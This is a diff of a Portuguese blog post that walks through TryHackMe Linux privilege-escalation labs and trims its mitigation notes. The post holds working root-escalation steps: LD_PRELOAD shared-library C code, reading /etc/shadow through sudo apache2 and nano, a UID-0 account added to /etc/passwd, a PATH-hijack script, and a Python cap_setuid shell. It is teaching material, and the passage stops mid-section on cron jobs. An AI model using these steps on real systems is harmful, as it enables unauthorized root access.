@@ -1,7 +1,7 @@
 ---
 layout: post
 title: "Linux Privilege Escalation - do sudo ao NFS"
-description: "Walkthrough didático de seis técnicas de escalação de privilégios em laboratórios TryHackMe: sudo e LD_PRELOAD, SUID, PATH Hijacking, Linux Capabilities, Cron Jobs e NFS, com troubleshooting, comandos comentados, mitigação e glossário."
+description: "Walkthrough de Linux Privilege Escalation no TryHackMe: enumeração de sistema, usuário, rede e arquivos, seguido de sudo, SUID, PATH Hijacking, capabilities, Cron Jobs e NFS. Comandos explicados, dicas e troubleshooting."
 date: 2026-10-09
 categories: [walkthrough, pentest, linux, tryhackme]
 tags: [linux, privilege-escalation, sudo, ld-preload, suid, path-hijacking, capabilities, cron, nfs, gtfobins, tryhackme]
@@ -11,102 +11,170 @@ tags: [linux, privilege-escalation, sudo, ld-preload, suid, path-hijacking, capa
 
 # Linux Privilege Escalation - do sudo ao NFS
 
-## 1. Introdução
+## Introdução
 
-Neste estudo, reuni os exercícios de **Linux Privilege Escalation** do TryHackMe para entender como configurações inseguras permitem que um usuário comum, como <code>john</code>, obtenha privilégios de <code>root</code>.
+Neste estudo, reuni os exercícios de **Linux Privilege Escalation** do TryHackMe para entender e aprender como configurações inseguras permitem que um usuário comum, como <code>john</code>, obtenha privilégios de <code>root</code>.
 
-O ponto principal é **identificar qual permissão está errada, entender por que ela é perigosa e testar a hipótese**. Organizei seis vetores, os erros que encontrei nas VMs, as verificações de sucesso e as formas de corrigir as falhas.
+O ponto principal é **identificar qual permissão está errada, entender por que ela é perigosa e testar a hipótese**. Organizei os seis vetores que estudei, os comandos utilizados e as verificações que ajudam a entender o resultado.
 
 > **Escopo:** os comandos foram usados em VMs autorizadas. Não execute alterações de autenticação, arquivos SUID ou compartilhamentos NFS em sistemas sem autorização. Os IPs das VMs são temporários e podem mudar após um reset.
 
-### Índice rápido
+### Índice
 
-1. [Enumeração inicial](#enumeracao)
-2. [Sudo, Apache2 e LD_PRELOAD](#sudo)
-3. [SUID e edição do /etc/passwd](#suid)
-4. [PATH Hijacking](#path-hijacking)
-5. [Linux Capabilities](#capabilities)
-6. [Cron Jobs](#cron)
-7. [NFS e no_root_squash](#nfs)
-8. [Erros comuns e dúvidas](#duvidas)
-9. [Tabela de comandos e operadores](#comandos)
-10. [Glossário de siglas e conceitos](#glossario)
-11. [Mitigação e conclusão](#mitigacao)
+- [Enumeração inicial](#enumeracao)
+  - [Enumeration: OS](#enum-os)
+  - [Enumeration: User](#enum-user)
+  - [Enumeration: Network](#enum-network)
+  - [Enumeration: File](#enum-file)
+- [Escalação de privilégios](#escalacao)
+  - [Sudo, Apache2 e LD_PRELOAD](#sudo)
+  - [SUID](#suid)
+  - [PATH Hijacking](#path-hijacking)
+  - [Capabilities](#capabilities)
+  - [Cron Jobs](#cron)
+  - [NFS e no_root_squash](#nfs)
+- [Erros comuns e dúvidas](#duvidas)
+- [Tabela de comandos e operadores](#comandos)
+- [Glossário de siglas e conceitos](#glossario)
+- [Mitigação e conclusão](#mitigacao)
 
 ---
 
 <a id="enumeracao"></a>
 
-## 2. Enumeração inicial: onde procurar primeiro?
+## Enumeração inicial
 
-Antes de explorar qualquer coisa, é necessário saber **quem somos** e **quais privilégios ou configurações especiais existem**.
+Antes de pensar em um exploit, precisamos conhecer a máquina. **Enumeração** é exatamente isso: levantar informações e procurar configurações fora do padrão.
+
+Em vez de sair executando várias ferramentas de uma vez, costumo começar com algumas perguntas:
+
+- Qual é a versão do Linux?
+- Quem sou eu e quais comandos posso executar?
+- Quais serviços, portas e compartilhamentos existem?
+- Quais arquivos e executáveis possuem permissões interessantes?
+
+<a id="enum-os"></a>
+
+### Enumeration: OS
+
+~~~bash
+uname -a
+cat /etc/os-release
+uname -r
+ps aux | head
+~~~
+
+O <code>uname</code> mostra informações do sistema e do kernel; <code>/etc/os-release</code> ajuda a identificar a distribuição. <code>ps aux</code> lista processos, e <code>head</code> limita a saída às primeiras linhas.
+
+Essas informações ajudam a entender o ambiente antes de pesquisar versões, serviços ou possíveis problemas de configuração.
+
+<a id="enum-user"></a>
+
+### Enumeration: User
 
 ~~~bash
 id
 whoami
+groups
 sudo -l
-echo "$PATH"
 ~~~
 
-- <code>id</code> exibe UID, GID e grupos.
-- <code>whoami</code> mostra o nome associado ao UID efetivo.
-- <code>sudo -l</code> lista comandos autorizados pelo sudo.
-- <code>echo "$PATH"</code> revela os diretórios onde o shell procura executáveis.
+- <code>id</code> mostra [UID e GID](#conceito-uid), além dos grupos.
+- <code>whoami</code> mostra o usuário efetivo.
+- <code>groups</code> lista os grupos do usuário.
+- <code>sudo -l</code> mostra quais programas podemos executar por meio do sudo e com quais condições.
 
-Em seguida, procure executáveis [SUID](#conceito-suid), [capabilities](#conceito-capabilities), tarefas agendadas e compartilhamentos de rede:
+Um detalhe importante: **poder usar um programa com sudo não significa ter autorização para todos os programas**.
+
+<a id="enum-network"></a>
+
+### Enumeration: Network
 
 ~~~bash
-# SUID root, ignorando erros e exibindo apenas os caminhos
-find / -type f -user root -perm -4000 -printf '%p\n' 2>/dev/null
-
-# Capabilities atribuídas a executáveis
-getcap -r / 2>/dev/null
-
-# Tarefas cron do sistema
-cat /etc/crontab
-ls -la /etc/cron.d/
-
-# Compartilhamentos NFS exportados
+ip -br addr
+ss -tuln
 cat /etc/exports
 ~~~
 
-### Dica: buscas menores e resultados mais limpos
+O primeiro comando resume as interfaces e endereços IP. O <code>ss</code> mostra portas TCP/UDP em escuta, e <code>/etc/exports</code> permite verificar se o servidor disponibiliza diretórios via [NFS](#conceito-nfs).
 
-Quando a saída do <code>find</code> fica grande, começar pelos diretórios de executáveis comuns pode ajudar:
+Quando existe um servidor NFS no escopo, podemos enumerar seus compartilhamentos a partir da máquina atacante:
+
+~~~bash
+showmount -e <TARGET_IP>
+~~~
+
+O uso de <code>&lt;TARGET_IP&gt;</code> representa o IP da VM alvo, e não o IP da AttackBox.
+
+<a id="enum-file"></a>
+
+### Enumeration: File
+
+Aqui encontramos muitas das pistas usadas nas próximas etapas.
+
+**Binários SUID pertencentes ao root:**
+
+~~~bash
+find / -type f -user root -perm -4000 -printf '%p\n' 2>/dev/null
+~~~
+
+**Capabilities dos executáveis:**
+
+~~~bash
+getcap -r / 2>/dev/null
+~~~
+
+**Arquivos que meu usuário consegue modificar:**
+
+~~~bash
+find /opt /usr/local/bin /home -type f -writable -printf '%p\n' 2>/dev/null
+~~~
+
+**Diretórios graváveis:**
+
+~~~bash
+find / -type d -writable -printf '%p\n' 2>/dev/null | sort -u
+~~~
+
+Para ter uma saída menor durante a investigação, podemos limitar a busca:
 
 ~~~bash
 find /usr/bin /usr/local/bin -type f -user root -perm -4000 -printf '%p\n' 2>/dev/null
 ~~~
 
-Se não aparecer nada incomum, amplie para o sistema todo. Em uma das VMs, o binário vulnerável estava em <code>/opt/path/mywhoami</code>, então **restringir a busca para sempre a /usr/bin perderia a descoberta**.
+E, quando aparecem dezenas de resultados de pacotes Snap:
 
 ~~~bash
 find / -type f -user root -perm -4000 -printf '%p\n' 2>/dev/null | grep -v '^/snap/'
 ~~~
 
-Outras buscas úteis:
+**Dica:** começar com uma busca curta é ótimo, mas sempre amplie quando não encontrar nada. Em uma das VMs, o executável vulnerável estava em <code>/opt/path/mywhoami</code>, fora dos diretórios pesquisados inicialmente.
 
-~~~bash
-# Diretórios em que o usuário pode escrever
-find / -type d -writable -printf '%p\n' 2>/dev/null | sort -u
-
-# Arquivos modificáveis em locais frequentemente relevantes
-find /opt /usr/local/bin /home -type f -writable -printf '%p\n' 2>/dev/null
-~~~
-
-**Correção importante:** <code>-perm -4000</code> procura o bit **SUID**, não SGID. Para SGID, use <code>-perm -2000</code>. Consulte o [glossário](#glossario).
+Para consultar o potencial de abuso de um executável encontrado, uso o [GTFOBins](https://gtfobins.github.io/), que organiza técnicas por categorias como sudo, SUID e capabilities.
 
 [↑ Voltar ao índice](#topo)
 
 ---
 
+<a id="escalacao"></a>
+
+## Escalação de privilégios
+
+Depois da enumeração, o desafio é entender **qual configuração permite fazer algo que o usuário comum não deveria conseguir**. Cada VM explorou uma situação diferente.
+
 <a id="sudo"></a>
 
-## 3. Sudo: programas autorizados, Apache2 e LD_PRELOAD
+### Privilege Escalation: Sudo, Apache2 e LD_PRELOAD
 
-### 3.1 Entendendo o sudo -l
+No Linux, <code>sudo</code> permite executar comandos como outro usuário, normalmente root. Isso é útil na administração do sistema, mas pode se tornar perigoso se programas poderosos forem liberados sem restrição.
 
-Na VM <code>sudo-box</code>, o comando retornou:
+Na VM <code>sudo-box</code>, executei:
+
+~~~bash
+sudo -l
+~~~
+
+E encontrei:
 
 ~~~text
 User john may run the following commands on sudo-box:
@@ -117,61 +185,40 @@ Matching Defaults entries:
     env_keep+=LD_PRELOAD
 ~~~
 
-Isso significa:
+Ou seja: podia executar Nano e Apache2 como root sem senha. A configuração também preservava <code>LD_PRELOAD</code>.
 
-- <code>john</code> pode executar **nano** e **apache2** por meio de <code>sudo</code> sem fornecer senha.
-- A variável de ambiente <code>LD_PRELOAD</code> pode ser preservada pelo <code>sudo</code>.
-- **Não** significa que <code>john</code> possa executar qualquer programa com sudo.
+#### Ler arquivo protegido com Nano
 
-Por isso o comando copiado de outro exemplo falhou:
-
-~~~bash
-sudo LD_PRELOAD=/home/user/ldpreload/shell.so find
-~~~
-
-O programa <code>find</code> **não constava no sudo -l**. Além disso, o caminho da biblioteca pertencia ao exemplo, não ao ambiente <code>/home/john</code>.
-
-### 3.2 Ler um arquivo protegido com Nano
-
-Como o Nano estava autorizado pelo sudo, a leitura de um arquivo protegido poderia ser feita assim:
+Como o Nano estava liberado, bastava usar:
 
 ~~~bash
 sudo /usr/bin/nano -v /etc/shadow
 ~~~
 
-O parâmetro <code>-v</code> ativa o modo de visualização, sem edição. O arquivo <code>/etc/shadow</code> contém campos de autenticação, normalmente incluindo hashes de senha, e possui acesso restrito.
+O <code>-v</code> abre em modo de visualização. O <code>/etc/shadow</code> armazena informações protegidas de autenticação, incluindo hashes de senha quando existem.
 
-### 3.3 Apache2: vazamento por mensagem de erro
+#### Apache2: leitura indireta por mensagem de erro
 
-Outro exemplo do exercício:
+O Apache possui a opção <code>-f</code>, que define um arquivo alternativo de configuração. Se indicarmos um arquivo que não contém diretivas Apache, ele tentará interpretá-lo e poderá revelar partes do conteúdo no erro.
 
 ~~~bash
 sudo /usr/sbin/apache2 -C "LoadModule mpm_event_module /usr/lib/apache2/modules/mod_mpm_event.so" -f /etc/shadow
 ~~~
 
-O Apache respondeu:
+Resultado:
 
 ~~~text
 AH00526: Syntax error on line 1 of /etc/shadow:
 Invalid command 'root:*:18561:0:99999:7:::'
 ~~~
 
-A opção <code>-f</code> pede ao Apache que trate <code>/etc/shadow</code> como seu arquivo de configuração. A primeira linha não é uma diretiva Apache válida; por isso ela foi reproduzida na mensagem de erro.
+Aqui o Apache **conseguiu ler a primeira linha**, mas não conseguiu interpretá-la como configuração. O asterisco no campo da senha de root indica que não havia ali um hash de senha utilizável. Portanto, ler essa linha não significou recuperar a senha de root.
 
-**Importante:** o campo <code>*</code> não era um hash da senha root. Ele indica uma conta sem hash utilizável para autenticação por senha. O vazamento da linha foi demonstrado, mas não havia ali um hash de root para quebrar.
+#### LD_PRELOAD: biblioteca carregada antes do programa
 
-| Opção | Papel |
-|---|---|
-| <code>sudo</code> | Executar programa autorizado com privilégios elevados |
-| <code>-C "diretiva"</code> | Processar diretiva antes de ler a configuração |
-| <code>LoadModule</code> | Carregar módulo Apache |
-| <code>-f arquivo</code> | Usar arquivo alternativo de configuração |
+O <code>LD_PRELOAD</code> permite solicitar que o carregador dinâmico carregue uma biblioteca compartilhada antes das bibliotecas usuais do programa. Na administração comum isso pode servir para depuração ou testes; em uma regra sudo mal configurada, abre espaço para executar código com privilégios elevados.
 
-### 3.4 LD_PRELOAD: injetando uma biblioteca
-
-O carregador dinâmico pode carregar bibliotecas compartilhadas antes da inicialização de um programa por meio de <code>LD_PRELOAD</code>. Se o sudo permite preservar essa variável e executar um programa adequado como root, isso pode permitir execução de código com privilégios elevados.
-
-O arquivo C do laboratório, com o cabeçalho que inicialmente faltou, fica assim:
+**Código da biblioteca usada no laboratório:**
 
 ~~~c
 #include <stdio.h>
@@ -187,13 +234,38 @@ void _init(void) {
 }
 ~~~
 
-No diretório pessoal, salve como <code>shell.c</code> e compile:
+Para salvar o código no terminal sem abrir um editor, podemos usar <code>cat</code> com um *here-document*:
+
+~~~bash
+cat > shell.c <<'EOF'
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/types.h>
+#include <unistd.h>
+
+void _init(void) {
+    unsetenv("LD_PRELOAD");
+    setgid(0);
+    setuid(0);
+    system("/bin/bash");
+}
+EOF
+~~~
+
+O <code>cat</code> recebe o texto até a linha <code>EOF</code>, e o operador <code>&gt;</code> cria ou substitui <code>shell.c</code>. Para acrescentar conteúdo sem substituir o arquivo, usamos <code>&gt;&gt;</code>.
+
+Agora compilamos a biblioteca compartilhada:
 
 ~~~bash
 gcc -fPIC -shared -o shell.so shell.c -nostartfiles
 ~~~
 
-Depois, na VM de laboratório que autorizava o Nano:
+- <code>-fPIC</code>: gera código independente da posição na memória.
+- <code>-shared</code>: cria uma biblioteca compartilhada, geralmente com extensão <code>.so</code>.
+- <code>-o</code>: nome do arquivo final.
+- <code>-nostartfiles</code>: não inclui os arquivos padrão de inicialização.
+
+E executamos um programa autorizado pelo sudo, apontando para a biblioteca:
 
 ~~~bash
 sudo LD_PRELOAD=/home/john/shell.so /usr/bin/nano
@@ -201,18 +273,9 @@ id
 whoami
 ~~~
 
-A execução registrada no laboratório retornou <code>uid=0(root)</code>.
+No laboratório, o resultado foi uma shell com <code>uid=0(root)</code>.
 
-**Por que apareceu um aviso de compilação?** Sem <code>#include &lt;unistd.h&gt;</code>, o compilador avisou que <code>setgid()</code> e <code>setuid()</code> não tinham declaração visível. O <code>shell.so</code> ainda havia sido produzido, mas o correto é incluir esse cabeçalho.
-
-| Opção GCC | Explicação |
-|---|---|
-| <code>-fPIC</code> | Gera código independente de posição |
-| <code>-shared</code> | Cria uma biblioteca compartilhada |
-| <code>-o shell.so</code> | Define o arquivo de saída |
-| <code>-nostartfiles</code> | Não utiliza arquivos padrão de inicialização |
-
-**Mitigação:** conceder somente os comandos estritamente necessários, impedir a preservação indevida de variáveis perigosas e revisar permissões de execução via sudo. Veja também [Sudo](#conceito-sudo) e [LD_PRELOAD](#conceito-ldpreload) no glossário.
+**O que aprendemos:** não basta um comando aparecer no <code>sudo -l</code>; é preciso entender o que ele permite fazer e quais variáveis o sudo preserva. Veja também [LD_PRELOAD](#conceito-ldpreload).
 
 [↑ Voltar ao índice](#topo)
 
@@ -220,53 +283,57 @@ A execução registrada no laboratório retornou <code>uid=0(root)</code>.
 
 <a id="suid"></a>
 
-## 4. SUID: editor privilegiado e /etc/passwd
+### Privilege Escalation: SUID
 
-### 4.1 Identificar o binário vulnerável
+O [SUID](#conceito-suid) permite que um executável rode com o UID efetivo de seu proprietário. Se o proprietário é root, o programa pode receber privilégios que nosso usuário não possui.
 
-Na VM <code>suid-box</code>, a enumeração encontrou:
+Isso é normal em alguns executáveis do sistema, mas **um editor genérico com SUID root é uma configuração especialmente perigosa**.
+
+#### Encontrar o binário
+
+Na VM <code>suid-box</code>:
+
+~~~bash
+find / -type f -user root -perm -4000 -printf '%p\n' 2>/dev/null | grep -v '^/snap/'
+~~~
+
+O arquivo que chamou atenção foi:
 
 ~~~text
 /usr/bin/vim.basic
 ~~~
 
-Confirme as permissões:
+Confirmei:
 
 ~~~bash
 ls -l /usr/bin/vim.basic
 ~~~
 
-Resultado real:
-
 ~~~text
 -rwsr-xr-x 1 root root 4126400 ... /usr/bin/vim.basic
 ~~~
 
-O <code>s</code> no campo do proprietário indica o bit **SUID** ativado. Nesse caso, o executável pertence ao root. Programas de edição de arquivos normalmente **não deveriam** possuir essa permissão.
+O <code>s</code> no lugar do <code>x</code> das permissões do proprietário indica que o SUID está ativo.
 
-> Atenção à diferença: <code>/usr/bin/vim</code> era um link simbólico para <code>/etc/alternatives/vim</code>. O executável com SUID confirmado era <code>/usr/bin/vim.basic</code>.
+#### Entender o /etc/passwd
 
-### 4.2 O que é UID 0 e por que /etc/passwd importa?
-
-O Linux identifica as contas por números chamados [UID](#conceito-uid). O root utiliza UID <code>0</code>.
-
-Uma linha típica do arquivo de contas é:
-
-~~~text
-root:x:0:0:root:/root:/bin/bash
-~~~
-
-Seu formato possui **sete campos**:
+O arquivo <code>/etc/passwd</code> contém informações das contas Linux, como nome, UID, GID, diretório pessoal e shell. Seu formato é:
 
 ~~~text
 usuario:senha-ou-indicador:UID:GID:comentario:home:shell
 ~~~
 
-Normalmente, <code>x</code> indica que o hash está em <code>/etc/shadow</code>, não em <code>/etc/passwd</code>. Uma conta adicional com UID 0 também recebe identidade administrativa. **Isso não substitui automaticamente a linha original de root; adiciona outra conta com o mesmo UID.**
+Exemplo:
 
-### 4.3 Hash usado no laboratório
+~~~text
+root:x:0:0:root:/root:/bin/bash
+~~~
 
-O exercício utilizou:
+O <code>x</code> costuma indicar que o hash de senha está armazenado em <code>/etc/shadow</code>. Já o **UID 0** identifica a conta com privilégios de root.
+
+Na room, o objetivo era adicionar uma conta de laboratório com UID 0 usando o editor que tinha SUID.
+
+#### Gerar o hash da senha
 
 ~~~bash
 openssl passwd -1 -salt THM password1
@@ -278,76 +345,44 @@ Resultado:
 $1$THM$WnbwlliCqxFRQepUTCkUT1
 ~~~
 
-- <code>openssl passwd</code>: gera um hash de senha.
-- <code>-1</code>: seleciona **MD5-crypt** (obsoleto em produção).
-- <code>-salt THM</code>: define o salt usado no exemplo.
-- <code>password1</code>: senha escolhida para a conta de laboratório.
+O <code>-1</code> seleciona MD5-crypt, um formato antigo e inadequado para senhas em produção. <code>THM</code> é o *salt* e <code>password1</code> é a senha escolhida.
 
-Gerar o hash **não adiciona um usuário**. Ele precisa constar de uma entrada válida no banco de contas.
+**Gerar um hash não cria o usuário.** Ele é apenas uma parte dos dados de autenticação.
 
-### 4.4 Procedimento executado na room
+#### Editar a conta de laboratório
 
-Na VM isolada, o Vim com SUID permitiu abrir o arquivo protegido:
+Abra o binário que realmente tinha SUID:
 
 ~~~bash
 /usr/bin/vim.basic /etc/passwd
 ~~~
 
-No editor:
-
-1. Pressione <code>G</code> para ir ao final do arquivo.
-2. Pressione <code>o</code> para abrir uma nova linha.
-3. Adicione a entrada mostrada no material:
+No Vim, vá ao fim do arquivo com <code>G</code>, crie uma nova linha com <code>o</code> e acrescente a entrada fornecida no exercício:
 
 ~~~text
 hacker:$1$THM$WnbwlliCqxFRQepUTCkUT1:0:0:root:/root:/bin/bash
 ~~~
 
-4. Pressione <code>Esc</code>, digite <code>:wq</code> e confirme para salvar e sair.
-
-Agora verifique que a conta foi registrada:
+Pressione <code>Esc</code>, use <code>:wq</code> para salvar e sair, e confirme que a conta existe:
 
 ~~~bash
 getent passwd hacker
 ~~~
 
-E, no laboratório:
+Por fim:
 
 ~~~bash
 su hacker
 ~~~
 
-Senha definida no exercício: <code>password1</code>. A confirmação real foi:
+A senha escolhida era <code>password1</code>. Confirmei:
 
 ~~~text
 uid=0(root) gid=0(root) groups=0(root)
 root
 ~~~
 
-A flag recuperada na VM foi:
-
-~~~text
-THM{root-by-SUID-vulns}
-~~~
-
-### 4.5 Erros que aconteceram
-
-- <code>su hacker</code> retornou “user hacker does not exist”: o hash havia sido gerado, mas **a entrada ainda não havia sido gravada no /etc/passwd**.
-- <code>su THM</code> não funcionou: <code>THM</code> era o **salt**, não o nome do usuário.
-- <code>su newuser</code> não funcionou: essa conta não existia.
-- Se uma linha de <code>/etc/passwd</code> tiver quantidade errada de separadores, o sistema pode rejeitá-la. Para identificar entradas com formato incorreto:
-
-~~~bash
-awk -F: 'NF != 7 {print NR, $0}' /etc/passwd
-~~~
-
-- Para verificar contas que usam UID 0:
-
-~~~bash
-awk -F: '$3 == 0 {print $1, $3, $4}' /etc/passwd
-~~~
-
-**Mitigação:** remover SUID de editores, restringir modificações de arquivos de autenticação, auditar duplicações de UID 0 e utilizar políticas de controle de acesso apropriadas. Esta alteração da room não deve ser reproduzida em sistemas de produção.
+A técnica funcionou porque o editor conseguiu alterar um arquivo protegido. A nova conta compartilhou o UID 0 do root — não foi necessário descobrir a senha original.
 
 [↑ Voltar ao índice](#topo)
 
@@ -355,35 +390,23 @@ awk -F: '$3 == 0 {print $1, $3, $4}' /etc/passwd
 
 <a id="path-hijacking"></a>
 
-## 5. PATH Hijacking: substituir o comando procurado
+### Privilege Escalation: PATH Hijacking
 
-### 5.1 O que é PATH?
+O <code>PATH</code> é uma variável com os diretórios em que o Linux procura programas quando usamos um comando sem informar o caminho completo.
 
-O shell consulta os diretórios definidos na variável <code>PATH</code> quando um comando é chamado sem caminho absoluto. A ordem importa: **o primeiro executável correspondente costuma ser utilizado**.
+Por exemplo, ao executar <code>whoami</code>, o shell procura um programa com esse nome nos diretórios do PATH. Já <code>/usr/bin/whoami</code> aponta diretamente para o arquivo correto.
 
-Exemplo:
+O **PATH Hijacking** acontece quando conseguimos colocar um executável controlado por nós em um diretório pesquisado antes do verdadeiro.
 
-~~~text
-/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
-~~~
+#### Identificar o programa vulnerável
 
-Se um binário privilegiado executa <code>system("whoami")</code>, em vez de <code>/usr/bin/whoami</code>, podemos investigar se é possível influenciar qual executável será localizado.
-
-### 5.2 Encontrar o executável real
-
-O material didático usava um programa chamado <code>program</code> que chamava <code>thm</code>. **Na VM real ele não existia**:
-
-~~~bash
-find / -type f -name 'program' 2>/dev/null
-~~~
-
-A busca SUID mais ampla revelou:
+No material da room, o exemplo usava um programa chamado <code>program</code> que procurava <code>thm</code>. Na VM real, esse arquivo não existia. A enumeração SUID revelou outro candidato:
 
 ~~~text
 /opt/path/mywhoami
 ~~~
 
-Investigação:
+Investiguei assim:
 
 ~~~bash
 ls -l /opt/path/mywhoami
@@ -400,29 +423,31 @@ whoami
 system@GLIBC_2.2.5
 ~~~
 
-As strings não são prova completa do fluxo de execução, mas, junto ao comportamento do programa, indicavam que ele utilizava <code>system()</code> para chamar <code>whoami</code> sem caminho absoluto.
+O <code>strings</code> extrai textos legíveis de arquivos binários. Ele não substitui uma análise completa do código, mas ajuda a identificar nomes de comandos e funções que merecem investigação.
 
-### 5.3 Incluir /tmp no início do PATH
+Nesse caso, o comportamento indicava uma chamada equivalente a <code>system("whoami")</code> sem caminho absoluto.
+
+#### Colocar /tmp no início do PATH
 
 ~~~bash
 export PATH=/tmp:$PATH
 echo "$PATH"
 ~~~
 
-Agora a busca começa por <code>/tmp</code>. O diretório é gravável pelo usuário, o que permite preparar um executável com o nome procurado.
+O <code>/tmp</code> é um diretório gravável. Colocando-o no início da lista, o programa pode encontrar primeiro um comando que criarmos ali.
 
-### 5.4 Criar o comando substituto sem editor
+#### Criar o executável correspondente
 
-Como o executável vulnerável procurava **whoami**, não <code>thm</code>, o arquivo correto era <code>/tmp/whoami</code>:
+O programa real procurava **whoami**, então foi esse nome que usamos:
 
 ~~~bash
 printf '#!/bin/sh\n/bin/bash -p\n' > /tmp/whoami
 chmod 755 /tmp/whoami
 ~~~
 
-O script chama o Bash com <code>-p</code> para preservar os privilégios efetivos disponíveis. <code>chmod 755</code> é suficiente; não é necessário deixar o arquivo gravável por todos com <code>777</code>.
+O <code>printf</code> cria o texto diretamente pelo terminal; <code>\n</code> insere quebras de linha. O Bash usa <code>-p</code> para preservar privilégios efetivos quando disponíveis.
 
-### 5.5 Executar e confirmar
+#### Executar e conferir
 
 ~~~bash
 /opt/path/mywhoami
@@ -430,18 +455,14 @@ id
 /usr/bin/whoami
 ~~~
 
-Resultado observado no laboratório:
+A VM confirmou:
 
 ~~~text
 uid=0(root) gid=0(root) groups=0(root),1001(john)
 root
 ~~~
 
-**Por que <code>whoami</code> parecia não mostrar nada depois da escalação?** O comando sem caminho absoluto continuava apontando para <code>/tmp/whoami</code>, que abria outro Bash em vez de imprimir o usuário. Para conferir a identidade sem reutilizar o comando sequestrado, use <code>/usr/bin/whoami</code> ou <code>id</code>.
-
-**Observação técnica:** scripts por si só normalmente não recebem SUID funcional no Linux. Aqui, o processo privilegiado era **o binário SUID que iniciou o script**. A efetividade do ataque depende de como ele lida com UID e com o ambiente.
-
-**Mitigação:** usar caminhos absolutos em programas privilegiados, limpar/definir um PATH confiável, evitar chamadas desnecessárias a shells e remover SUID indevido.
+**Detalhe interessante:** depois do hijacking, executar apenas <code>whoami</code> chamaria nosso script em <code>/tmp</code> outra vez. Por isso usei <code>/usr/bin/whoami</code> na verificação.
 
 [↑ Voltar ao índice](#topo)
 
@@ -449,70 +470,45 @@ root
 
 <a id="capabilities"></a>
 
-## 6. Linux Capabilities: permissões mais granulares que root
+### Privilege Escalation: Capabilities
 
-As [capabilities](#conceito-capabilities) permitem conceder operações privilegiadas específicas sem dar todos os poderes do root a um programa.
+As [Linux Capabilities](#conceito-capabilities) dividem alguns privilégios administrativos em permissões específicas. Em vez de dar todos os poderes de root a um programa, o administrador pode permitir apenas certas operações.
 
-### 6.1 Enumerar
+Por exemplo, <code>cap_net_raw</code> permite determinadas operações de rede; <code>cap_setuid</code> permite alterar o UID do processo.
 
-Na VM <code>capabilities-box</code>:
+#### Procurar capabilities
 
 ~~~bash
 getcap -r / 2>/dev/null | grep -v '^/snap/'
 ~~~
 
-A saída registrada apontava:
+Na <code>capabilities-box</code>, encontrei:
 
 ~~~text
 /usr/bin/python3.12 cap_setuid=ep
 ~~~
 
-A capability <code>cap_setuid</code> permite alterar o UID do processo. Os sufixos <code>e</code> e <code>p</code> indicam que a capability entra nos conjuntos **effective** e **permitted**.
+O <code>cap_setuid</code> era o ponto principal. O <code>e</code> significa *effective* e o <code>p</code>, *permitted*: a capability estava disponível para o programa utilizar.
 
-### 6.2 Entender e testar a condição
-
-O exercício pode ser demonstrado diretamente com o Python que recebeu essa capability:
+#### Executar usando o Python identificado
 
 ~~~bash
 /usr/bin/python3.12 -c 'import os; os.setuid(0); os.execl("/bin/bash", "bash", "-p")'
 ~~~
 
-Explicação:
+- <code>-c</code> executa código Python informado diretamente.
+- <code>import os</code> carrega funções do sistema operacional.
+- <code>os.setuid(0)</code> altera o UID para 0 usando a capability.
+- <code>os.execl()</code> substitui o processo pela shell Bash.
 
-| Trecho | Função |
-|---|---|
-| <code>python3.12 -c</code> | Executar um trecho de Python |
-| <code>import os</code> | Acessar funções do sistema operacional |
-| <code>os.setuid(0)</code> | Solicitar alteração do UID para 0 |
-| <code>os.execl(...)</code> | Substituir o processo pelo Bash |
-| <code>bash -p</code> | Preservar privilégios disponíveis |
-
-Confirmação:
+Confira com:
 
 ~~~bash
 id
 /usr/bin/whoami
 ~~~
 
-**Nota de registro:** a capability do Python foi identificada nos apontamentos da VM, mas a conversa não contém uma saída final comprovando a execução desse comando nessa etapa.
-
-### 6.3 O erro com ./vim
-
-O material do exercício também citava execução de Python dentro do Vim. Foi tentado:
-
-~~~bash
-./vim -c ':py3 import os; os.setuid(0); ...'
-~~~
-
-E o shell respondeu:
-
-~~~text
--bash: ./vim: No such file or directory
-~~~
-
-Isso acontece porque <code>./vim</code> procura um arquivo chamado <code>vim</code> **no diretório atual**. Mais importante: na VM enumerada, a capability estava no <code>/usr/bin/python3.12</code>, não no Vim. O procedimento precisa acompanhar o **binário efetivamente identificado**, e não ser copiado de outro cenário.
-
-**Mitigação:** auditar <code>getcap -r /</code>, remover capabilities desnecessárias de interpretadores e limitar operações privilegiadas ao mínimo indispensável.
+O importante aqui é verificar **qual executável recebeu a capability**. Neste ambiente ela pertencia ao Python, portanto não fazia sentido copiar literalmente um exemplo de Vim apresentado em outro material.
 
 [↑ Voltar ao índice](#topo)
 
@@ -520,24 +516,24 @@ Isso acontece porque <code>./vim</code> procura um arquivo chamado <code>vim</co
 
 <a id="cron"></a>
 
-## 7. Cron Jobs: script gravável executado pelo root
+### Privilege Escalation: Cron Jobs
 
-O [Cron](#conceito-cron) executa comandos periodicamente. Se uma tarefa do root aponta para um script que usuários comuns podem alterar, **o conteúdo inserido será executado com os privilégios da tarefa**.
+O **Cron** é o agendador de tarefas do Linux. É muito usado para backups, limpeza de arquivos, manutenção e outras rotinas automáticas.
 
-### 7.1 Enumerar os agendamentos
+O problema aparece quando uma tarefa é executada pelo root, mas chama um script que um usuário comum consegue editar.
+
+#### Procurar tarefas agendadas
 
 ~~~bash
 cat /etc/crontab
 ls -la /etc/cron.d /etc/cron.* 2>/dev/null
 ~~~
 
-Na VM <code>cron-box</code>, chamou a atenção:
+Na <code>cron-box</code>, encontrei o arquivo <code>/etc/cron.d/cleanup</code>:
 
-~~~text
-/etc/cron.d/cleanup
+~~~bash
+cat /etc/cron.d/cleanup
 ~~~
-
-Seu conteúdo era:
 
 ~~~text
 SHELL=/bin/bash
@@ -546,9 +542,9 @@ PATH=/home/ubuntu:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 * * * * * root /usr/local/bin/cleanup.sh
 ~~~
 
-Os cinco asteriscos representam minuto, hora, dia do mês, mês e dia da semana. Nessa entrada, a tarefa roda **a cada minuto**.
+Os cinco asteriscos representam minuto, hora, dia do mês, mês e dia da semana. Nesse caso, a tarefa é executada **a cada minuto**, como <code>root</code>.
 
-### 7.2 Conferir o script e as permissões
+#### Verificar permissões e conteúdo
 
 ~~~bash
 ls -l /usr/local/bin/cleanup.sh
@@ -556,13 +552,13 @@ cat /usr/local/bin/cleanup.sh
 namei -l /usr/local/bin/cleanup.sh
 ~~~
 
-No laboratório:
+Resultado:
 
 ~~~text
